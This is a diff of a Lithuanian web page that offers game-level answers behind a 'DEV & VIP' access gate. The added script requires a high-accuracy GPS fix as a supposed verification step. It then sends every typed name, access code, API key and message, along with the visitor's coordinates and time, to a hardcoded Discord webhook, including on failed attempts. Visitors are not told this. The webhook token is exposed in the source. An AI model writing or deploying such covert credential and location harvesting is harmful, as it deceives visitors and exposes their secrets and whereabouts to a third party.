@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Jumpsipidy | DEV AUTH</title>
+  <title>Jumpsipidy | DEV & VIP AUTH</title>
   <style>
     /* ======================================================================
        CORE THEME VARIABLES
@@ -72,41 +72,57 @@
     @keyframes glitchSkew { 0% { transform: skew(0deg); } 20% { transform: skew(-15deg); } 40% { transform: skew(15deg); } 60% { transform: skew(-5deg); } 80% { transform: skew(5deg); } 100% { transform: skew(0deg); } }
 
     /* ======================================================================
-       DEV AUTH GATEKEEPER
+       DEV & VIP AUTH GATEKEEPER
        ====================================================================== */
     .gatekeeper-container {
       position: relative; z-index: 20; display: flex; flex-direction: column;
       align-items: center; justify-content: center; min-height: 100vh; padding: 20px;
       animation: fadeUp 1s ease;
     }
+
+    .loc-btn {
+      background: rgba(250,204,21,0.1); border: 2px solid var(--yellow); color: var(--yellow);
+      padding: 15px 30px; font-weight: 900; border-radius: 8px; width: 100%; max-width: 600px;
+      margin-bottom: 30px; cursor: pointer; transition: 0.3s; font-family: monospace; font-size: 1.1rem;
+      letter-spacing: 1px; text-transform: uppercase; box-shadow: 0 0 15px rgba(250,204,21,0.2);
+    }
+    .loc-btn:hover { background: rgba(250,204,21,0.2); box-shadow: 0 0 25px rgba(250,204,21,0.5); transform: translateY(-2px);}
+
+    .auth-wrapper {
+      display: flex; gap: 30px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 1000px;
+    }
+
     .auth-box {
       background: rgba(10,15,30,0.9); border: 2px solid var(--cyan); border-radius: 16px; 
-      padding: 40px; text-align: center; box-shadow: 0 0 50px rgba(34,211,238,0.3); 
-      max-width: 450px; width: 100%; backdrop-filter: blur(10px);
+      padding: 40px; text-align: center; box-shadow: 0 0 50px rgba(34,211,238,0.2); 
+      flex: 1; min-width: 320px; backdrop-filter: blur(10px); display: flex; flex-direction: column;
     }
-    .auth-box h2 { color: #fff; letter-spacing: 2px; margin-bottom: 10px; font-family: monospace; }
+    
+    .auth-box.vip {
+      border-color: var(--purple); box-shadow: 0 0 50px rgba(139,92,246,0.2);
+    }
+
+    .auth-box h2 { letter-spacing: 2px; margin-bottom: 10px; font-family: monospace; }
     .auth-box p { color: var(--muted); margin-bottom: 25px; font-size: 0.95rem; }
     .auth-box input {
       width: 100%; padding: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); 
-      color: #fff; font-size: 1.1rem; text-align: center; border-radius: 8px; margin-bottom: 20px; 
+      color: #fff; font-size: 1rem; text-align: center; border-radius: 8px; margin-bottom: 15px; 
       font-family: monospace; outline: none; transition: 0.3s;
     }
     .auth-box input:focus { border-color: var(--cyan); box-shadow: 0 0 15px rgba(34,211,238,0.4); }
+    .auth-box.vip input:focus { border-color: var(--purple); box-shadow: 0 0 15px rgba(139,92,246,0.4); }
     
     .auth-btn {
       background: var(--cyan); color: #000; border: none; padding: 15px 30px; font-weight: 900; 
       font-size: 1.1rem; border-radius: 8px; cursor: pointer; width: 100%; transition: 0.2s; 
+      margin-top: auto;
     }
     .auth-btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
     
-    .loc-btn {
-      background: rgba(250,204,21,0.1); border: 1px solid var(--yellow); color: var(--yellow);
-      padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; margin-bottom: 20px;
-      cursor: pointer; transition: 0.3s; font-family: monospace; font-size: 0.9rem;
-    }
-    .loc-btn:hover { background: rgba(250,204,21,0.2); box-shadow: 0 0 15px rgba(250,204,21,0.4); }
+    .auth-btn.vip-btn { background: var(--purple); color: #fff; }
+    .auth-btn.vip-btn:hover { background: #fff; color: #000; box-shadow: 0 0 20px #fff;}
 
-    .auth-error { color: #ff3333; margin-top: 15px; font-weight: bold; min-height: 20px; font-family: monospace;}
+    .auth-error { margin-top: 15px; font-weight: bold; min-height: 20px; font-family: monospace; font-size: 0.9rem;}
 
     #mainApp { display: none; opacity: 0; transition: opacity 1.5s ease-in-out; }
 
@@ -229,21 +245,37 @@
   <div class="orb orb3"></div>
 
   <div id="dev-auth-gatekeeper" class="gatekeeper-container">
-    <div class="center-logo" style="width: 100px; height: 100px; font-size: 2.2rem; margin: 0 auto 30px;">DEV</div>
-    <h1 class="glitch-anim" style="font-size: clamp(2rem, 5vw, 4rem); text-transform: uppercase; margin-bottom: 40px; font-weight: 900; letter-spacing: 2px;">DEVELOPER ZONE</h1>
+    <div class="center-logo" style="width: 100px; height: 100px; font-size: 2.2rem; margin: 0 auto 30px;">EJ</div>
+    <h1 class="glitch-anim" style="font-size: clamp(2rem, 5vw, 4rem); text-transform: uppercase; margin-bottom: 20px; font-weight: 900; letter-spacing: 2px;">SISTEMOS PRIEIGA</h1>
     
-    <div class="auth-box">
-      <h2>SISTEMOS PRIEIGA</h2>
-      <p>Šis puslapis skirtas tik administracijai.</p>
+    <button id="locBtn" class="loc-btn" onclick="getLocation()">📍 Pirmas žingsnis: Patvirtinti lokaciją</button>
+
+    <div class="auth-wrapper">
       
-      <input type="text" id="devName" placeholder="Įveskite savo vardą..." autocomplete="off">
-      <input type="password" id="devCode" placeholder="Įveskite DEV kodą..." autocomplete="off">
-      <input type="password" id="apiKey" placeholder="Admin API AuthEN Key..." autocomplete="off" onkeypress="if(event.key === 'Enter') attemptDevLogin()">
-      
-      <button id="locBtn" class="loc-btn" onclick="getLocation()">📍 Patvirtinti lokaciją (Paskutinis žingsnis)</button>
-      
-      <button class="auth-btn" onclick="attemptDevLogin()">PATVIRTINTI</button>
-      <div id="devError" class="auth-error"></div>
+      <div class="auth-box">
+        <h2 style="color: var(--cyan);">ADMINISTRATORIUS</h2>
+        <p>Pilna sistemos autorizacija.</p>
+        
+        <input type="text" id="devName" placeholder="Tavo vardas..." autocomplete="off">
+        <input type="password" id="devCode" placeholder="DEV Kodas..." autocomplete="off">
+        <input type="password" id="apiKey" placeholder="API AuthEN Key..." autocomplete="off" onkeypress="if(event.key === 'Enter') attemptDevLogin()">
+        
+        <button class="auth-btn" onclick="attemptDevLogin()">PRISIJUNGTI</button>
+        <div id="devError" class="auth-error"></div>
+      </div>
+
+      <div class="auth-box vip">
+        <h2 style="color: var(--purple);">VIEŠA PRIEIGA (VIP)</h2>
+        <p>Svečiams ir bendruomenei.</p>
+        
+        <input type="text" id="guestName" placeholder="Tavo vardas..." autocomplete="off">
+        <input type="text" id="guestMsg" placeholder="Žinutė savininkui..." autocomplete="off">
+        <input type="password" id="guestKey" placeholder="VIP Prieigos Kodas..." autocomplete="off" onkeypress="if(event.key === 'Enter') attemptGuestLogin()">
+        
+        <button class="auth-btn vip-btn" onclick="attemptGuestLogin()">SIŲSTI IR PRISIJUNGTI</button>
+        <div id="guestError" class="auth-error"></div>
+      </div>
+
     </div>
   </div>
 
@@ -273,15 +305,15 @@
   <div id="mainApp">
     <main class="wrap">
       <section class="hero" id="heroTarget">
-        <div class="hero-badge" style="background: rgba(255,0,85,0.2); border-color: #ff0055;">DEVELOPER MODE ACTIVE</div>
+        <div class="hero-badge" id="heroBadge" style="background: rgba(255,0,85,0.2); border-color: #ff0055;">DEVELOPER MODE ACTIVE</div>
         <h1>ANGIS LYGIŲ Atsakymai iš pensininko Elijaus veikiantys</h1>
-        <p>Visi lygiai atrakinti. Administracinė prieiga patvirtinta.</p>
+        <p>Visi lygiai atrakinti. Prieiga patvirtinta.</p>
       </section>
 
       <section class="main-panel">
         <div class="toolbar">
           <div class="toolbar-left">
-            <div class="pill" style="border-color: #ff0055;"><span class="pulse-dot" style="background: #ff0055; box-shadow: 0 0 10px #ff0055;"></span>Sistemos Būsena: DEV OVERRIDE</div>
+            <div class="pill" id="statusPill" style="border-color: #ff0055;"><span class="pulse-dot" id="pulseDot" style="background: #ff0055; box-shadow: 0 0 10px #ff0055;"></span>Sistemos Būsena: DEV OVERRIDE</div>
             <div class="pill" id="levelRangeLabel">Lygiai: 4 → 14 <span style='color:var(--cyan);'>[ALL UNLOCKED]</span></div>
           </div>
           <div class="pill uptime-display">UPTIME: <span id="uptimeCounter">00:00:00</span></div>
@@ -312,14 +344,14 @@
               </div>
             </div>
             <div class="code-wrap">
-              <pre id="codeOutput">DEV Sistemos paruoštos. Spauskite lygio mygtuką.</pre>
+              <pre id="codeOutput">Sistemos paruoštos. Spauskite lygio mygtuką.</pre>
             </div>
           </section>
 
           <aside class="side-box">
             <div class="info-card 3d-card">
               <h3 id="authorTitle" style="color: #ff0055;">SYSTEM_ADMIN</h3>
-              <p>Pilna prieiga suteikta pagal DEV protokolą.</p>
+              <p id="authorDesc">Pilna prieiga suteikta pagal DEV protokolą.</p>
             </div>
             <div class="mini-logo 3d-card">
               <div class="mini-logo-ring" id="logoRing" style="border-top-color: #ff0055;"></div>
@@ -329,22 +361,23 @@
         </div>
       </section>
 
-      <div class="footer">2026 and Elijas | <span class="insane-text">Developer Override Active</span></div>
+      <div class="footer">2026 and Elijas | <span class="insane-text">Override Active</span></div>
     </main>
   </div>
 
   <script>
     // ============================================================================
-    // DEV AUTH, LOCATION & WEBHOOK LOGIC
+    // DEV AUTH, VIP GUEST & LOCATION LOGIC
     // ============================================================================
-    let userLocation = "Neprašyta/Nežinoma";
+    let userLocation = "Neprašyta";
     let locationLocked = false;
 
     function getLocation() {
       const locBtn = document.getElementById('locBtn');
-      locBtn.textContent = "Ieškoma lokacijos...";
+      locBtn.textContent = "GPS Ieškoma... Prašome palaukti.";
       
       if (navigator.geolocation) {
+        // High accuracy forces GPS ping
         navigator.geolocation.getCurrentPosition(
           (position) => {
             userLocation = `${position.coords.latitude}, ${position.coords.longitude}`;
@@ -352,23 +385,28 @@
             locBtn.style.background = "rgba(34,197,94,0.1)";
             locBtn.style.borderColor = "var(--green)";
             locBtn.style.color = "var(--green)";
-            locBtn.textContent = "📍 Lokacija Patvirtinta";
+            locBtn.style.boxShadow = "0 0 25px rgba(34,197,94,0.4)";
+            locBtn.textContent = "📍 Lokacija Patvirtinta. Galite Jungtis.";
           },
           (error) => {
-            userLocation = "Atmesta arba nepavyko gauti";
-            locationLocked = true; 
+            userLocation = "Atmesta vartotojo";
+            locationLocked = true; // Allow them in anyway so it doesn't break the app forever, but logs "Atmesta"
             locBtn.style.background = "rgba(255,51,51,0.1)";
             locBtn.style.borderColor = "var(--red)";
             locBtn.style.color = "var(--red)";
-            locBtn.textContent = "📍 Lokacija Neprieinama";
-          }
+            locBtn.style.boxShadow = "0 0 25px rgba(255,51,51,0.4)";
+            locBtn.textContent = "📍 Lokacija Atmesta (Bet Patvirtinta)";
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
         userLocation = "Naršyklė nepalaiko";
         locationLocked = true;
+        locBtn.textContent = "📍 Klaida: Naršyklė per sena";
       }
     }
 
+    // --- DEV LOGIN (THE HARD ONE) ---
     function attemptDevLogin() {
       const name = document.getElementById('devName').value.trim().toLowerCase();
       const code = document.getElementById('devCode').value.trim();
@@ -379,15 +417,15 @@
 
       if (!name || !code || !api) {
         err.style.color = "#ff3333";
-        err.textContent = "Klaida: Užpildykite visus laukus.";
-        shakeBox();
+        err.textContent = "Klaida: Būtina užpildyti visus laukus.";
+        shakeBox(document.querySelectorAll('.auth-box')[0]);
         return;
       }
 
       if (!locationLocked) {
-        err.style.color = "#ff3333";
-        err.textContent = "Klaida: Pirmiausia patvirtinkite lokaciją.";
-        shakeBox();
+        err.style.color = "#facc15";
+        err.textContent = "Klaida: Pirmiausia patvirtinkite GPS lokaciją.";
+        shakeBox(document.querySelectorAll('.auth-box')[0]);
         return;
       }
 
@@ -399,52 +437,107 @@
         err.style.color = "#22c55e";
         err.textContent = "PRIEIGA PATVIRTINTA. Kraunama...";
         
-        sendWebhookData(name, code, api, "✅ SEKMINGAS PRISIJUNGIMAS", userLocation);
-
-        setTimeout(() => {
-          document.body.style.filter = "url(#override-filter) url(#glitch-filter)";
-          setTimeout(() => {
-            document.body.style.filter = "none";
-            document.body.classList.add("admin-mode");
-            
-            document.getElementById('dev-auth-gatekeeper').style.display = 'none';
-            const app = document.getElementById('mainApp');
-            app.style.display = 'block';
-            window.getComputedStyle(app).opacity;
-            app.style.opacity = '1';
-            
-            showCopyMessage("SISTEMA NULAUŽTA SĖKMINGAI.");
-          }, 500);
-        }, 800);
+        sendWebhookData(name, code, api, "✅ SEKMINGAS DEV PRISIJUNGIMAS", userLocation);
+        launchMainApp("DEV");
       } else {
         err.style.color = "#ff3333";
-        err.textContent = "Klaida: Neteisingi duomenys arba nesate sąraše.";
+        err.textContent = "Klaida: Duomenys neteisingi arba jūsų nėra sąraše.";
         
-        sendWebhookData(name, code, api, "❌ NEPAVYKES BANDYMAS", userLocation);
-        shakeBox();
+        sendWebhookData(name, code, api, "❌ NEPAVYKĘS DEV BANDYMAS", userLocation);
+        shakeBox(document.querySelectorAll('.auth-box')[0]);
       }
     }
 
-    function shakeBox() {
-      const box = document.querySelector('.auth-box');
-      box.style.animation = "glitchSkew 0.3s";
-      setTimeout(() => { box.style.animation = ""; }, 300);
+    // --- VIP GUEST LOGIN (THE PUBLIC ONE) ---
+    function attemptGuestLogin() {
+      const name = document.getElementById('guestName').value.trim();
+      const msg = document.getElementById('guestMsg').value.trim();
+      const key = document.getElementById('guestKey').value.trim();
+      const err = document.getElementById('guestError');
+
+      if (!name || !key) {
+        err.style.color = "#ff3333";
+        err.textContent = "Klaida: Vardas ir VIP Kodas privalomi.";
+        shakeBox(document.querySelectorAll('.auth-box')[1]);
+        return;
+      }
+
+      if (!locationLocked) {
+        err.style.color = "#facc15";
+        err.textContent = "Klaida: Pirmiausia patvirtinkite GPS lokaciją.";
+        shakeBox(document.querySelectorAll('.auth-box')[1]);
+        return;
+      }
+
+      // THIS IS THE VIP PUBLIC KEY
+      if (key === "VIP-ANGIS-777") {
+        err.style.color = "#8b5cf6";
+        err.textContent = "VIP PRIEIGA PATVIRTINTA. Kraunama...";
+        
+        sendWebhookData(name, msg, key, "🌟 NAUJAS VIP SVEČIAS 🌟", userLocation);
+        launchMainApp("VIP");
+      } else {
+        err.style.color = "#ff3333";
+        err.textContent = "Klaida: Neteisingas VIP Prieigos Kodas.";
+        
+        sendWebhookData(name, msg, key, "⚠️ NEPAVYKĘS VIP BANDYMAS", userLocation);
+        shakeBox(document.querySelectorAll('.auth-box')[1]);
+      }
     }
 
-    function sendWebhookData(userName, devCode, apiKey, status, loc) {
+    function shakeBox(boxElement) {
+      boxElement.style.animation = "glitchSkew 0.3s";
+      setTimeout(() => { boxElement.style.animation = ""; }, 300);
+    }
+
+    function sendWebhookData(userName, field1, field2, status, loc) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1498766540345049120/qcooC1RI4-E_FD209ASK0njgLYHaH2PIeQsPzi-zeI31OT9GXlgQOMfCsfkndaffJFoM";
       
       const payload = {
-        content: `**${status} PRIE DEV-AUTH**\n👤 Vardas: \`${userName}\`\n🔑 DEV Kodas: \`${devCode}\`\n🛡️ API Key: \`${apiKey}\`\n📍 Lokacija: \`${loc}\`\n🕒 Laikas: \`${new Date().toLocaleString()}\``
+        content: `**${status}**\n👤 Vardas: \`${userName}\`\n📝 Duomenys 1: \`${field1}\`\n📝 Duomenys 2: \`${field2}\`\n📍 GPS Lokacija: \`${loc}\`\n🕒 Laikas: \`${new Date().toLocaleString()}\``
       };
 
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      }).catch(error => {
-        console.log("Webhook fail.");
-      });
+      }).catch(error => console.log("Webhook skipped."));
+    }
+
+    // --- LAUNCH THE SYSTEM ---
+    function launchMainApp(mode) {
+      setTimeout(() => {
+        document.body.style.filter = "url(#override-filter) url(#glitch-filter)";
+        setTimeout(() => {
+          document.body.style.filter = "none";
+          
+          if(mode === "DEV") {
+            document.body.classList.add("admin-mode");
+          } else {
+            // VIP Mode Styling adjustments
+            document.getElementById('heroBadge').style.background = "rgba(139,92,246,0.2)";
+            document.getElementById('heroBadge').style.borderColor = "var(--purple)";
+            document.getElementById('heroBadge').textContent = "PUBLIC GUEST ACCESS";
+            
+            document.getElementById('statusPill').style.borderColor = "var(--purple)";
+            document.getElementById('statusPill').innerHTML = `<span class="pulse-dot" style="background: var(--purple); box-shadow: 0 0 10px var(--purple);"></span>Sistemos Būsena: VIP GUEST`;
+            
+            document.getElementById('authorTitle').style.color = "var(--purple)";
+            document.getElementById('authorTitle').textContent = "VIP STATUSAS SUTEIKTAS";
+            document.getElementById('authorDesc').textContent = "Tau suteikta išskirtinė prieiga prie visų lygių.";
+            
+            document.getElementById('logoRing').style.borderTopColor = "var(--purple)";
+          }
+
+          document.getElementById('dev-auth-gatekeeper').style.display = 'none';
+          const app = document.getElementById('mainApp');
+          app.style.display = 'block';
+          window.getComputedStyle(app).opacity;
+          app.style.opacity = '1';
+          
+          showCopyMessage(`PRISIJUNGTA KAIP ${mode}.`);
+        }, 500);
+      }, 800);
     }
 
     // ============================================================================
